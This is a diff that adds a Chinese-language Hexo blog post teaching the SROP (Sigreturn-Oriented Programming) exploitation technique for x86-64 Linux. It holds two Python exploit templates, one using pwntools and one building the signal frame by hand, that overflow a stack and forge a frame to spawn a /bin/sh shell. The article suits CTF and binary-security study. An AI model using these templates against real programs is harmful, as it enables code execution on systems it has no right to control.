@@ -1,0 +1,470 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>SROP 利用技术 | 良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>SROP 利用技术</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/6/10
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #00bcd4">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/SROP/" style="color: #03a9f4">
+                    SROP
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/ROP/" style="color: #00a596">
+                    ROP
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><code>pwntools</code> 里面有这个类：<code>SigreturnFrame()</code>。它能自动帮你生成对应架构下完美的、对齐的伪造栈帧字节流。  </p>
+<pre><code class="language-python">from pwn import *
+
+# 1. 初始化环境配置 (极其重要，SigreturnFrame 依赖它来决定结构体大小)
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+context.log_level = &#39;debug&#39;
+
+# --- 假设我们已经找到的地址常量 ---
+offset = 40                    # 覆盖到返回地址所需的垃圾数据长度
+syscall_ret = 0x401150         # syscall; ret; 的地址
+set_rax_15_ret = 0x401160      # 假设存在的 gadget: mov rax, 15; ret
+bin_sh_addr = 0x402000         # &quot;/bin/sh&quot; 字符串的地址
+
+io = process(&#39;./vuln_program&#39;)
+
+# ==========================================
+# [ SROP 核心伪造区 ]
+# ==========================================
+# 2. 实例化一个空的信号帧
+frame = SigreturnFrame()
+
+# 3. 像填表一样，填入你期望的寄存器最终状态
+# 我们想要执行: execve(&quot;/bin/sh&quot;, NULL, NULL)
+frame.rax = 59              # 59 是 execve 的系统调用号
+frame.rdi = bin_sh_addr     # 第一个参数: 指向 &quot;/bin/sh&quot;
+frame.rsi = 0               # 第二个参数: NULL
+frame.rdx = 0               # 第三个参数: NULL
+
+# 4. 最关键的一步：现场恢复后，程序接着去哪执行？
+# 既然寄存器已经准备好执行 execve 了，我们必须让 RIP 再次指向 syscall 去触发它
+frame.rip = syscall_ret     
+
+# ==========================================
+# [ 组装 Payload 区 ]
+# ==========================================
+# 第一部分：常规的栈溢出垃圾数据
+payload = b&#39;A&#39; * offset
+
+# 第二部分：触发 sys_sigreturn
+# 也就是让 RAX=15，然后执行 syscall
+payload += p64(set_rax_15_ret) 
+payload += p64(syscall_ret)
+
+# 第三部分：紧跟其后，放上我们伪造的庞大 Signal Frame
+# sys_sigreturn 执行时，会直接把紧挨着它的这块数据当成现场进行恢复
+payload += bytes(frame)
+
+# ==========================================
+# [ 发送与接管 ]
+# ==========================================
+print(&quot;[+] Sending SROP Payload...&quot;)
+io.sendline(payload)
+
+# 享受你的 Shell
+io.interactive()
+</code></pre>
+<p>SROP (Sigreturn Oriented Programming) 的本质，是<strong>利用操作系统内核（Kernel）对栈数据的“盲目信任”</strong>。</p>
+<h4 id="1-正常的信号处理流程"><a href="#1-正常的信号处理流程" class="headerlink" title="1. 正常的信号处理流程"></a>1. 正常的信号处理流程</h4><p>假设你的程序正在运行，突然产生了一个异常（比如你按了 Ctrl+C 触发了 <code>SIGINT</code>），或者定时器到了（<code>SIGALRM</code>）。系统是怎么处理的？</p>
+<ol>
+<li><strong>打断执行，保存现场：</strong> 内核（Kernel）会强行暂停你的程序。为了等会儿能恢复，内核会把你当前所有的 CPU 寄存器（RAX, RDI, RIP, RSP, 段寄存器等）全部打包，<strong>推到你的用户态栈（User Stack）上</strong>。这个巨大的数据包，就是 <strong>Signal Frame（信号帧）</strong>。</li>
+<li><strong>执行处理函数：</strong> 内核把 <code>RIP</code> 指向对应的信号处理函数去执行。</li>
+<li><strong>恢复现场 (</strong><code>**sigreturn**</code><strong>)：</strong> 处理结束后，程序会调用一个特殊的系统调用 <code>sys_sigreturn</code>（64位下调用号是 15）。内核收到这个调用后，会去栈上把刚才存的 Signal Frame 拿出来，<strong>然后塞回所有的硬件寄存器里</strong>，程序就像什么都没发生一样继续运行。</li>
+</ol>
+<h4 id="2-逻辑漏洞"><a href="#2-逻辑漏洞" class="headerlink" title="2. 逻辑漏洞"></a>2. 逻辑漏洞</h4><p>一个致命的逻辑漏洞：<strong>内核在执行 <strong><code>**sys_sigreturn**</code></strong> 恢复现场时，根本不检查栈上的 Signal Frame 是不是原来自己保存的那个！</strong></p>
+<p>只要你：</p>
+<ol>
+<li>用栈溢出，在栈上填满一个<strong>伪造的 Signal Frame</strong>。</li>
+<li>想办法让 <code>RAX = 15</code>。</li>
+<li>执行 <code>syscall</code> 指令。</li>
+</ol>
+<p>内核会把伪造的数据当成合法的现场，原封不动地塞进 CPU 的每一个寄存器。</p>
+<h3 id="什么时候不能用-SigreturnFrame-？"><a href="#什么时候不能用-SigreturnFrame-？" class="headerlink" title="什么时候不能用 SigreturnFrame()？"></a>什么时候不能用 <code>SigreturnFrame()</code>？</h3><p><code>pwntools</code> 的 <code>SigreturnFrame()</code> </p>
+<ol>
+<li><strong>无 Python&#x2F;无 pwntools 环境：</strong> 实战打某些内网机器，或者写 C 语言的 Exploit 时，只能依靠底层的结构体和系统调用，不能依赖 Python 库。</li>
+<li><strong>特殊架构或老旧内核：</strong><code>pwntools</code> 里的结构体模板是固定的（基于较新的主流 Linux）。遇到偏门的 MIPS 路由器，或者魔改过内核的 IoT 设备，它的帧结构偏移是对不上的，用 <code>pwntools</code> 生成发过去直接段错误。</li>
+<li><strong>栈空间极其有限：</strong> 64 位下的一个完整 Signal Frame 长达 <strong>248 字节</strong>。如果程序的溢出长度只有 100 字节怎么办？ 用不了 <code>SigreturnFrame()</code>！这时候我们需要“<strong>部分伪造</strong>”——只精准覆盖前几个关键寄存器（如 RDI, RSI, RIP），后面利用栈上原有的残余数据碰运气，这种骚操作只能手写。我觉得也能栈迁移继续写</li>
+<li><strong>绕过沙箱 (Bypass Seccomp)：</strong> 有时候你需要在一个帧里嵌套另一个帧，或者利用帧的某些未定义字段，直接利用库函数无法修改这些</li>
+</ol>
+<p>手搓信号帧，是<strong>根据 Linux 内核源码中的 <strong><code>**ucontext_t**</code></strong> 结构体，对着偏移量在特定的字节位置填入你想要的值。</strong></p>
+<h4 id="1-设置好段寄存器"><a href="#1-设置好段寄存器" class="headerlink" title="1. 设置好段寄存器"></a>1. 设置好段寄存器</h4><p>手写最容易失败的原因在于：<strong>你必须提供合法的段寄存器（CS, SS 等）</strong>。 在 64 位 Linux 下：</p>
+<ul>
+<li>代码段寄存器 <code>**CS**</code>** 必须是 **<code>**0x33**</code></li>
+<li>栈段寄存器 <code>**SS**</code>** 必须是 **<code>**0x2b**</code></li>
+</ul>
+<p>如果这两个值是 0，<code>sys_sigreturn</code> 恢复上下文后，CPU 在用户态一切换，立刻因为权限异常触发 <code>Segmentation Fault</code>段错误。</p>
+<p>手写模板</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+import struct
+
+# ==========================================
+# [ 1. 核心武器库：手搓 Signal Frame ]
+# ==========================================
+class HandcraftedSigFrame:
+    &quot;&quot;&quot;
+    纯手工构建 64 位 Linux ucontext_t 结构体
+    总长度: 248 bytes (0xf8)
+    &quot;&quot;&quot;
+    def __init__(self):
+        # 初始化 248 字节的 0 (内核其实不关心没有用到的字段)
+        self.frame = bytearray(b&#39;\x00&#39; * 248)
+        
+        # --- 设置一些极其关键的默认值 (防止内核恢复现场时崩溃) ---
+        # 1. eflags: 必须包含合法标志，0x202 (IF, 中断允许标志位开启) 是最稳妥的
+        self.set_reg(&#39;eflags&#39;, 0x202)
+        
+        # 2. 段寄存器 (Segment Registers): x86_64 下的死规定
+        # 如果 CS != 0x33，CPU 会瞬间抛出权限异常 (General Protection Fault)
+        self.frame[0xb8:0xba] = struct.pack(&#39;&lt;H&#39;, 0x33) # CS = 0x33
+        self.frame[0xba:0xbc] = struct.pack(&#39;&lt;H&#39;, 0x00) # GS = 0
+        self.frame[0xbc:0xbe] = struct.pack(&#39;&lt;H&#39;, 0x00) # FS = 0
+        self.frame[0xbe:0xc0] = struct.pack(&#39;&lt;H&#39;, 0x2b) # SS = 0x2b
+
+    def set_reg(self, reg_name, val):
+        &quot;&quot;&quot;
+        根据 Linux 内核源码的偏移量，精准覆写 8 字节寄存器
+        &quot;&quot;&quot;
+        offsets = &#123;
+            &#39;r8&#39;: 0x28,  &#39;r9&#39;: 0x30,  &#39;r10&#39;: 0x38, &#39;r11&#39;: 0x40,
+            &#39;r12&#39;: 0x48, &#39;r13&#39;: 0x50, &#39;r14&#39;: 0x58, &#39;r15&#39;: 0x60,
+            &#39;rdi&#39;: 0x68, &#39;rsi&#39;: 0x70, &#39;rbp&#39;: 0x78, &#39;rbx&#39;: 0x80,
+            &#39;rdx&#39;: 0x88, &#39;rax&#39;: 0x90, &#39;rcx&#39;: 0x98, &#39;rsp&#39;: 0xa0,
+            &#39;rip&#39;: 0xa8, &#39;eflags&#39;: 0xb0
+        &#125;
+        if reg_name in offsets:
+            offset = offsets[reg_name]
+            # &lt;Q 代表小端序, 8 字节无符号整数 (64位机器标准)
+            self.frame[offset:offset+8] = struct.pack(&#39;&lt;Q&#39;, val)
+        else:
+            raise ValueError(f&quot;Unknown register: &#123;reg_name&#125;&quot;)
+
+    def build(self):
+        return bytes(self.frame)
+
+# ==========================================
+# [ 2. 全局环境与偏移配置 ]
+# ==========================================
+# 这里仅使用 pwntools 进行网络通信和 ELF 解析
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+
+# 目标程序 (这里假设漏洞程序名为 vuln)
+# io = process(&#39;./vuln&#39;)
+# io = remote(&#39;127.0.0.1&#39;, 1337)
+
+# --- 假设我们前期收集到的地址和 Gadget ---
+# (实战中你需要用 ROPgadget 工具或者 ELF() 去找这些地址)
+padding_size = 40                  # 栈溢出覆盖到 ret 所需的垃圾数据长度
+syscall_ret = 0x401150             # `syscall; ret;` 的地址
+set_rax_15_ret = 0x401160          # 假设的触发 Gadget: `mov rax, 15; ret;`
+bin_sh_addr = 0x402000             # 字符串 &quot;/bin/sh&quot; 所在的内存地址
+
+# ==========================================
+# [ 3. 构造与执行攻击 ]
+# ==========================================
+def pwn():
+    print(&quot;[+] 正在手动组装 Signal Frame...&quot;)
+    frame = HandcraftedSigFrame()
+    
+    # 填表时间：布置我们期望的寄存器状态 (目标：execve(&quot;/bin/sh&quot;, 0, 0))
+    frame.set_reg(&#39;rax&#39;, 59)            # 59 是 execve 的调用号
+    frame.set_reg(&#39;rdi&#39;, bin_sh_addr)   # 参数 1: &quot;/bin/sh&quot; 字符串指针
+    frame.set_reg(&#39;rsi&#39;, 0)             # 参数 2: NULL
+    frame.set_reg(&#39;rdx&#39;, 0)             # 参数 3: NULL
+    frame.set_reg(&#39;rip&#39;, syscall_ret)   # [关键]: 现场恢复后，立即执行 syscall
+
+    # 可选：如果你需要做连环 ROP，可以把 RSP 劫持到一个新的可控地址
+    # frame.set_reg(&#39;rsp&#39;, 0x403000) 
+
+    # 组装完整的恶意 Payload
+    payload = b&#39;A&#39; * padding_size       # 1. 垃圾数据，填满溢出空间
+    payload += p64(set_rax_15_ret)      # 2. 控制 RAX = 15 (sys_sigreturn)
+    payload += p64(syscall_ret)         # 3. 触发系统调用，内核开始去栈上取假现场
+    payload += frame.build()            # 4. 纯手工捏造的 248 字节假现场紧随其后
+
+    print(&quot;[+] Payload 组装完毕，长度:&quot;, len(payload))
+    print(&quot;[+] 正在发送 Payload 接管控制流...&quot;)
+    
+    # io.sendline(payload)
+    # io.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    pwn()
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="ice993/hexo-123"
+    data-repo-id="R_kgDOPWL0Lg"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPWL0Ls4Ct1k-"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
